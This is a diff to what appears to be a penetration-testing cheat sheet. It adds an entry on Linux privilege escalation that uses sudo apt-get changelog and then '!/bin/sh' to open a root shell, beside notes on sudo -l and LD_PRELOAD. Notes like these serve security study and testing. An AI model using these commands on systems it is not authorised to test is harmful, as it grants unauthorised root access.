@@ -3785,6 +3785,13 @@ Note: HTTPTunnel uses both a client (`htc`) and a server (`hts`)
 - `sudo -l` list the programs which sudo allows your user to run
 - See [GTFOBins](https://gtfobins.github.io) and search for the program names
 
+**apt-get privilege escalation**
+- [apt get | GTFOBins](https://gtfobins.github.io/gtfobins/apt-get/#sudo)
+  ```
+  sudo apt-get changelog apt
+  !/bin/sh
+  ```
+
 **Environment Variables**
 - `sudo -l` check which environment variables are inherited, look for the `env_keep` options
   - `LD_PRELOAD` loads a shared object before any others when a program is run 
